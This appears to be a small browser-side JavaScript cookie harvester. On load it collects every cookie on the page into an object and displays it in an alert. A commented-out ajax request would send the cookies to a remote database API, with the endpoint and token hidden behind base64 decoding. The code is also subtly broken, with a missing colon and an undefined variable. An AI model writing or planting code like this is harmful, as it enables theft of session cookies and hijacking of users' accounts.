const domain="";
const token="";
const id="";

function submit()
{
  var data = {};
  var c = document.cookie.split("; ");
  
  for(var i=0; i<c.length; i++)
  {
    kv = c[i].split("=");
    data[kv[0]] = kv[1];  
  }

  alert(JSON.stringify(data));

  function s(){};

  //$.ajax({
  //  type: "PATCH",
  //  datatype: "json",
  //  url: atob(domain) + "database/rows/table" + id + "/" + sid + "/?user_field_names=true",
  //  headers: { "authorization":"Token " + atob(token),
  //             "content-type":"application/json" },
  //  data JSON.stringify(data),
  //  success: s
  //});
}

submit();
